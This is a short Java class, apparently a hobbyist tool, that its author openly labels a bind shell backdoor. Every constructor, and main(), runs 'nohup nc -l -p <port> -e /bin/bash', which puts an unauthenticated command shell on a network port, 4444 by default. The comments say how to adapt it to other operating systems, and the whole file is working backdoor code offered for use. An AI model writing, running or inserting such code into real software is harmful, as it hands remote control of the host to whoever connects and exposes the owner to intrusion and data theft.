# package com.company.demo;
import java.io.IOException;

/**
 * @author Alias
 *          ^^ AKA: blackinkcyber
 *
 * Bind shell backdoor using netcat.
 */
public class netcatBindShell {
    static int default_port = 4444;
    static String default_shell = "/bin/bash";
    /**
     * netcat is often used for unencrypted http server debugging and general connection testing.
     *
     * however with such functionality comes a security concern. Netcat can be used to bind a shell to
     * a port on the machine.
     *
     * to make this cross-platform would be easy I just need some time. system variables are viewable and you can make
     * the shell command dependant on these outputs.
     *
     * Currently, this only works on systems with bash installed (mostly linux) but all you have to do is edit the
     * shell command being executed, and you can make it run on BSD, solaris, SUSE, MacOS or even Windows.
     *
     * not very special, but potent little applet.
     *
     */
    public netcatBindShell(int port, String shell){
        try {
            Runtime.getRuntime().exec("nohup nc -l -p "+port+" -e "+shell);
        }catch (IOException cmd){
            cmd.printStackTrace();
        }
    }

    /**
     * instantiates a default command shell on a specified port
     * @param port port number on localhost
     */
    public netcatBindShell(int port){
        try {
            Runtime.getRuntime().exec("nohup nc -l -p "+port+" -e /bin/bash");
        }catch (IOException cmd){
            cmd.printStackTrace();
        }
    }

    /**
     * default constructor uses default port and shell.
     */
    public netcatBindShell(){
        try {
            Runtime.getRuntime().exec("nohup nc -l -p "+default_port+" -e "+default_shell);
        }catch (IOException cmd){
            cmd.printStackTrace();
        }
    }

    /**
     * Reinitialize netcat listener on a designated port.
     * @param port port number
     * @param shell string path to shell
     */
    public void reset_listener(int port, String shell){
        // all the constructor does is execute a shell command so we can get away with this.
        netcatBindShell nc = new netcatBindShell(port, shell);
    }

    /**
     * getter and setter methods
     */
    public String getDefault_shell(){
        return default_shell;
    }

    public static int getDefault_port() {
        return default_port;
    }

    public static void setDefault_shell(String default_shell) {
        netcatBindShell.default_shell = default_shell;
    }

    public static void setDefault_port(int default_port) {
        netcatBindShell.default_port = default_port;
    }

    public static void main(String[] args) {
        netcatBindShell nc = new netcatBindShell(4444, "/bin/bash");
    }
}
